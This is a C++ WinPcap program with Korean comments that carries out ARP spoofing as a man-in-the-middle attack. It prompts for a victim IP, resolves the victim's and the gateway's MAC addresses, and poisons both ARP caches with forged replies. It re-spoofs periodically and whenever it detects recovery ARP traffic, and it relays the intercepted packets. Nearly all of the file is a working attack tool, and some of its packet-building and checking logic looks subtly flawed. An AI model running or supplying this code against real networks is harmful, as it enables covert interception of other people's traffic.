#include <stdlib.h>
#include <stdio.h>
#include <string>

#define  WPCAP
#define  HAVE_REMOTE
#define ETHER_ADDR_LEN 6
#define IP_ADDR_LEN 4
#include <pcap.h>
#include <WinSock2.h>
#include <IPHlpApi.h>
#include <time.h>
#include "packetheader.h"
#pragma comment(lib, "iphlpapi.lib")

using namespace std;
u_char broadcast[6]={255,255,255,255,255,255};
u_char null_mac[6]={0,0,0,0,0,0};

struct addressList{
    unsigned char MyIP[4] = {0,};
    unsigned char MyMAC[6] = {0,};
    unsigned char GatewayIP[4] = {0,};
    unsigned char GatewayMAC[6] = {0,};
    unsigned char VictimIP[4] = {0,};
    unsigned char VictimMAC[6] = {0,};
};

/*수신된 ARP reply 패킷이 보낸 ARP request에 대한 것인지를 판단하고 원하는 MAC_addr를 얻음*/
int replyARP_handler(const u_char *pkt_data, unsigned char * MyMac, unsigned char * MAC_addr){
    struct libnet_ethernet_hdr *EtherHeader;
    const u_char *pkt_data_pos;

    /*Etherenet Header*/
    pkt_data_pos=pkt_data;
    EtherHeader=(libnet_ethernet_hdr*)(pkt_data_pos);
    if(htons(EtherHeader->ether_type)!=0x0806 && htons(*((u_short *)(pkt_data_pos+20)))!=0x0002 ) //ARP packet인지 확인
    {
        return 0;
    }
    for(int i=0;i<ETHER_ADDR_LEN;i++)
    {
        if(EtherHeader->ether_dhost[i]!=MyMac[i])
            return 0;
    }
    for(int i=0;i<ETHER_ADDR_LEN;i++)
    MAC_addr[i]=(EtherHeader->ether_shost)[i];
    return 1;
}
/*사용자로 부터 입력 받은 인터페이스의 번호에 해당하는 이름을 변수로 넘겨 주어 어댑터의 정보 추출*/
int getAdapter(char * _AdapterName,unsigned char * MyIP,unsigned char * MyMac,unsigned char * GatewayIP) {

   PIP_ADAPTER_INFO adapterinfo;
   PIP_ADAPTER_INFO adapterinfo_ptr = NULL;
   char * adapter_result =NULL;

   ULONG AdapterInfoSize = sizeof (IP_ADAPTER_INFO);
   adapterinfo = (IP_ADAPTER_INFO *)malloc(AdapterInfoSize);
   if(GetAdaptersInfo(adapterinfo, &AdapterInfoSize)==ERROR_BUFFER_OVERFLOW)
   {
        free(adapterinfo);
        adapterinfo=(IP_ADAPTER_INFO*)malloc(AdapterInfoSize);
        if(GetAdaptersInfo(adapterinfo, &AdapterInfoSize)==NO_ERROR)
        {
            adapterinfo_ptr=adapterinfo;
            while((adapter_result=strstr(_AdapterName, adapterinfo_ptr->AdapterName))==NULL)
            {
                adapterinfo_ptr=adapterinfo_ptr->Next;
            }
            if(adapter_result==NULL) // 입력받은 인터페이스를 못 찾
            {
                printf("No match adapter!\n");
                return 0;
            }
            else //현재 adapter정보를 이용
            {
                /*나의 MAC주소*/
                memcpy(MyMac,&(adapterinfo_ptr->Address),ETHER_ADDR_LEN);
                /*나의 IP주소*/
                unsigned long ip_addr;
                ip_addr=inet_addr(adapterinfo_ptr->IpAddressList.IpAddress.String);
                memcpy(MyIP,&ip_addr,IP_ADDR_LEN);

                /*게이트웨이 IP주소*/
                unsigned long gateway_addr;
                gateway_addr=inet_addr(adapterinfo_ptr->GatewayList.IpAddress.String);
                memcpy(GatewayIP, &gateway_addr,IP_ADDR_LEN);
            }

        }
        else
        {
            printf("cannot get adapter information\n");
            return 0;
        }

   }
   return 0;

}
/*패킷의 주어진 입력 오프셋에 정보 입력*/
void packetMake(u_char * packet_offset, unsigned char * source, int size)
{
    for(int i=0;i<size;i++)
    {
        packet_offset[i]=source[i];
    }
}
void packetMake(u_char * packet_offset, const u_char * source, int size)
{
    for(int i=0;i<size;i++)
    {
        packet_offset[i]=source[i];
    }
}
/*패킷의 주어진 입력 오프셋에 정보 입력(short 변수)*/
void packetMake(u_char *packet_offset, u_short short_value)
{
    *((short*)packet_offset)=ntohs(short_value);
}
void arpPacketMake(u_char * packet, unsigned char * Ether_Daddr, unsigned char * Ether_Saddr,
                 unsigned char * sender_MAC,unsigned char * sender_IP,unsigned char * receiver_MAC,
                 unsigned char * receiver_IP, u_short _op)
{
    int index=0;

    u_short Type=0x0806;

    u_short HardType=0x0001;
    u_short ProtType=0x0800;
    u_char HardSize=ETHER_ADDR_LEN;
    u_char ProtSize=IP_ADDR_LEN;
    u_short OpCode=_op;

    packetMake(packet+index,Ether_Daddr,ETHER_ADDR_LEN); //destination mac
    index+=ETHER_ADDR_LEN;
    packetMake(packet+index,Ether_Saddr,ETHER_ADDR_LEN); //source mac
    index+=ETHER_ADDR_LEN;
    packetMake(packet+index,Type); //type
    index+=2;
    packetMake(packet+index,HardType);
    index+=2;
    packetMake(packet+index,ProtType);
    index+=2;
    packetMake(packet+index,(unsigned char *)(&HardSize),1);
    index+=1;
    packetMake(packet+index,(unsigned char *)(&ProtSize),1);
    index+=1;
    packetMake(packet+index,OpCode);
    index+=2;
    packetMake(packet+index,sender_MAC,ETHER_ADDR_LEN);
    index+=ETHER_ADDR_LEN;
    packetMake(packet+index,sender_IP,IP_ADDR_LEN);
    index+=IP_ADDR_LEN;
    packetMake(packet+index,receiver_MAC,ETHER_ADDR_LEN);
    index+=ETHER_ADDR_LEN;
    packetMake(packet+index,receiver_IP,IP_ADDR_LEN);
}

void Relay(pcap_t *adhandle,const u_char * rsv_packet,addressList list, int len, int from)
{
    u_char* packet=(u_char*)malloc(sizeof(u_char)*len);
    packetMake(packet,rsv_packet,len); // 패킷 그대로 복사
    if(from ==1) //victim -> gateway relay
    {
        packetMake(packet,list.GatewayMAC,ETHER_ADDR_LEN); //destination MAC 주소 Gateway로
        packetMake(packet+ETHER_ADDR_LEN,list.MyMAC,ETHER_ADDR_LEN); //sorcue MAC 주소 나의 주소로  cam때문에
    }
    else if(from==2) // gateway -> victim relay
    {
        packetMake(packet,list.VictimMAC,ETHER_ADDR_LEN); //destination MAC 주소 Gateway로
        packetMake(packet+ETHER_ADDR_LEN,list.MyMAC,ETHER_ADDR_LEN); //sorcue MAC 주소 나의 주소로  cam때문에
    }
    else
    {
        fprintf(stderr,"\nError sending the packet: %s   (Relay)\n", pcap_geterr(adhandle));
        free(packet);
        return ;
    }

    if(pcap_sendpacket(adhandle, packet,len)!=0)
    {
        fprintf(stderr,"\nError sending the packet: %s   (Relay)\n", pcap_geterr(adhandle));
        free(packet);
        return ;
    }
    else
    {
        printf("Relay Packet sended !\n");
    }
    free(packet);
}

void getMacAddrWithARP(pcap_t *adhandle,struct pcap_pkthdr *header,unsigned char * Ether_Daddr, unsigned char * Ether_Saddr,
                       unsigned char * sender_MAC,unsigned char * sender_IP, unsigned char * receiver_MAC,
                       unsigned char * receiver_IP, u_short _op, unsigned char * targetMAC)
{
    u_char packet[42];
    int replyARP=0;
    const u_char *rcv_data;
    time_t timer;
    int res;
    int i=0;


    arpPacketMake(packet,Ether_Daddr,Ether_Saddr,sender_MAC, sender_IP, receiver_MAC, receiver_IP,_op); // request ARP 만들기
    while(replyARP==0&&i<3)//ARP packet 송수신
    {
        if (pcap_sendpacket(adhandle, packet, 42 /* size */) != 0) // request ARP 보내기
        {
            fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(adhandle));
            return ;
        }
        else
        {
            printf("%d of 3  arp request packect sended!\n",i+1);
        }
        timer=time(NULL);
        while((res = pcap_next_ex( adhandle, &header, &rcv_data)) >= 0) //reply ARP 패킷 수신 대기
        {
            if(res == 0)
            {
                if((time(NULL))-timer>3) // arp reply를 5초간 기다림
                {
                    printf("time out!\n");
                    break;
                }
                continue;
            }
            else if(res == -1)
            {
                printf("Error reading the packets: %s\n", pcap_geterr(adhandle));
                return ;
            }
            if((replyARP=replyARP_handler(rcv_data,Ether_Saddr,targetMAC))==1)
            {
               printf("ARP Reply accepted! Getting gateway MAC address is successed !\n");
               break;
            }
        }
        i++;
    }

    if(replyARP==0)
    {
        printf("arp reply receiving failed!\n");
        exit(1);
    }
}


int isSpoofPacket(const u_char * rsv_packet, addressList list){

    libnet_ethernet_hdr* etherheader;
    libnet_ipv4_hdr* ipheader;
    etherheader=(libnet_ethernet_hdr*)rsv_packet;
    ipheader=(libnet_ipv4_hdr*)(rsv_packet+ETHER_ADDR_LEN*2+2);

    /*victim이 나에게 보낸 패킷*/
    if(!memcmp(etherheader->ether_dhost,list.MyMAC,ETHER_ADDR_LEN)&&
            !memcmp(etherheader->ether_shost,list.VictimMAC,ETHER_ADDR_LEN)&&
            memcmp(&(ipheader->ip_dst.S_un.S_un_b.s_b1),list.MyIP,IP_ADDR_LEN))
    {
        printf("victim -> gateway spoofed packet is arrived!!\n");
        return 1;
    }
    /*gateway가 나에게 보낸 패킷*/
    else if(!memcmp(etherheader->ether_dhost,list.MyMAC,ETHER_ADDR_LEN)&&
            !memcmp(etherheader->ether_shost,list.GatewayMAC,ETHER_ADDR_LEN)&&
            memcmp(&(ipheader->ip_dst.S_un.S_un_b.s_b1),list.MyIP,IP_ADDR_LEN))
    {
        printf("gateway -> victim spoofed packet is arrived!!\n");
        return 2;
    }
    else
    {
        return 0;
    }
}

int isARPPacket(const u_char * rsv_packet, addressList list){
     libnet_ethernet_hdr* etherheader;
     etherheader=(libnet_ethernet_hdr*)rsv_packet;

     if(!memcmp(etherheader->ether_dhost,broadcast,ETHER_ADDR_LEN)&&(
             !memcmp(etherheader->ether_shost,list.GatewayMAC,ETHER_ADDR_LEN)
                     ||!memcmp(etherheader->ether_shost,list.VictimMAC,ETHER_ADDR_LEN)))
     {
         printf("recovery arp packet detected! (sender -> reciever)\n");
         return 1;
     }
     else
     {
        return 0;// not arp
     }
}
void spoofPacketSend(pcap_t *adhandle, struct  addressList list){
    u_char arp_packet[42];
    /*sender spoofing*/
    arpPacketMake(arp_packet, list.VictimMAC, list.MyMAC, list.MyMAC, list.GatewayIP, list.VictimMAC, list.VictimIP, 0x0002);
    if (pcap_sendpacket(adhandle, arp_packet, 42 /* size */) != 0) //spoofing 패킷 보내기
    {
       fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(adhandle));
       return ;
    }
    else
    {
        printf("SenderSpoofing Packet sended !\n");
    }
    /*receiver spoofing*/
    arpPacketMake(arp_packet, list.GatewayMAC, list.MyMAC, list.GatewayMAC, list.VictimIP, list.GatewayMAC, list.GatewayIP, 0x0002);
    if (pcap_sendpacket(adhandle, arp_packet, 42 /* size */) != 0) //spoofing 패킷 보내기
    {
       fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(adhandle));
       return ;
    }
    else
    {
        printf("Receiver Spoofing Packet sended !\n");
    }
}

void spoofing_relay(pcap_t *adhandle, struct pcap_pkthdr *header, struct addressList list){
    libnet_ethernet_hdr *EtherHeader;
    const u_char *rcv_pkt;
    int res;

    time_t timer;
    timer=time(NULL);
    spoofPacketSend(adhandle,list); //first spoofpkt
    printf("First spoofing packet sended!!\n");
    while((res = pcap_next_ex( adhandle, &header, &rcv_pkt)) >= 0) //reply ARP 패킷 수신 대기
    {
        if(res == 0)
        {
            continue;
        }
        else if(res == -1)
        {
            printf("Error reading the packets: %s\n", pcap_geterr(adhandle));
            return ;
        }

        EtherHeader=(libnet_ethernet_hdr*)rcv_pkt;
        if((htons(EtherHeader->ether_type)==0x0806)&&isARPPacket(rcv_pkt,list)==1) // arp 패킷
        {
            spoofPacketSend(adhandle,list);
            printf("Recovery preventing spoofing packet sended!\n");
        }
        if(time(NULL)-timer>3)//3초 단위 주기적 스푸핑
        {
            spoofPacketSend(adhandle,list);
            printf("Interval spoofing packet sended!\n");
            timer=time(NULL);
        }

        if((htons(EtherHeader->ether_type)==0x0800)&&isSpoofPacket(rcv_pkt,list)==1) // ip 패킷
        {
            Relay(adhandle,rcv_pkt,list,header->len,1);
        }
        if((htons(EtherHeader->ether_type)==0x0800)&&isSpoofPacket(rcv_pkt,list)==2) // ip 패킷
        {
            Relay(adhandle,rcv_pkt,list,header->len,2);
        }
    }
}

int main()
{
    pcap_t *adhandle;
    pcap_if_t *alldevs;
    pcap_if_t *d;
    struct pcap_pkthdr *header;
    char errbuf[PCAP_ERRBUF_SIZE];
    int inum;
    int i=0;

    addressList addresslist;

    if (pcap_findalldevs_ex((char*)PCAP_SRC_IF_STRING, NULL, &alldevs, errbuf) == -1)
    {
        fprintf(stderr,"Error in pcap_findalldevs: %s\n", errbuf);
        exit(1);
    }

    /* Print the list */
    for(d=alldevs; d; d=d->next)
    {
        printf("%d. %s", i++, d->name);
        if (d->description)
            printf(" (%s)\n", d->description);
        else
            printf(" (No description available)\n");
    }

    if(i==0)
    {
        printf("\nNo interfaces found! Make sure WinPcap is installed.\n");
        return -1;
    }

    printf("Enter the interface number (0-%d):",i);
    scanf_s("%d", &inum);

    if(inum < 0 || inum > i-1)
    {
        printf("\nInterface number out of range.\n");
        /* Free the device list */
        pcap_freealldevs(alldevs);
        return -1;
    }

    /* Jump to the selected adapter */
    for(d=alldevs, i=0; i< inum-1 ;d=d->next, i++);

    /* Open the output device */
    if ( (adhandle= pcap_open(d->name,            // name of the device
                        100,                // portion of the packet to capture (only the first 100 bytes)
                        PCAP_OPENFLAG_PROMISCUOUS,  // promiscuous mode 내꺼만 잡음
                        1000,               // read timeout
                        NULL,               // authentication on the remote machine
                        errbuf              // error buffer
                        ) ) == NULL)
    {
        fprintf(stderr,"\nUnable to open the adapter. %s is not supported by WinPcap\n", adhandle);
        return -1;
    }

    getAdapter(d->name, addresslist.MyIP, addresslist.MyMAC, addresslist.GatewayIP); //어댑터 정보 가져오기

    /*사용자로 부터 Victim IP 주소 받기*/
    char str[16];
    unsigned long _tmp;
    printf("Victim IP Address (ex. 192.168.0.5) : ");
    scanf("%s",&str);
    _tmp=inet_addr(str);
    memcpy(addresslist.VictimIP,&_tmp,IP_ADDR_LEN);

    /*Gateway MAC 주소를 위한 ARP request 보내고 ARP reply받기*/
    getMacAddrWithARP(adhandle,header, broadcast, addresslist.MyMAC, addresslist.MyMAC,
                      addresslist.MyIP, null_mac, addresslist.GatewayIP, 0x0001, addresslist.GatewayMAC);


    /*victim MAC 주소를 위한 ARP request 보내고 ARP reply받기*/
    getMacAddrWithARP(adhandle,header,broadcast,addresslist.MyMAC, addresslist.MyMAC, addresslist.MyIP,
                      null_mac, addresslist.VictimIP,0x0001, addresslist.VictimMAC);

    /*spoofing&relay*/
    spoofing_relay(adhandle,header, addresslist);

    return 1;
}
